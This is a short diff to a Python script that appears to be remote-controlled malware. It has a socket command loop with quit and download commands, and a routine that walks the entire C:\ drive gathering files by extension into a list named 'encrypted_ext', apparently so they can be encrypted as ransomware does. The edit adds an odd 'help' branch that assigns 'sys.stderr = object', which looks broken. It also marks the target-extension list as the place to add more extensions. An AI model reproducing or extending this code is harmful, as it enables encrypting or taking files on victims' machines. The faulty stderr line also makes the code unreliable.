@@ -28,6 +28,10 @@ while True:
     if cmd.lower() in ['q', 'quit', 'x', 'exit']:
         break
 
+    if cmd.lower() in ['h', 'help']:
+        sys.stderr = object
+        continue
+
     # This will close the connection
     if cmd.lower() in ['down', 'download']:
         yesNo = s.recv(1024).decode()
@@ -59,7 +63,7 @@ while True:
             continue
         else:
             s.send('nt'.encode())
-            encrypted_ext = ['.txt', '.log']
+            encrypted_ext = ['.txt', '.log']    # Add extensions here
             file_paths = []
             for root, dirs, files in os.walk('C:\\'):
                 for file in files:
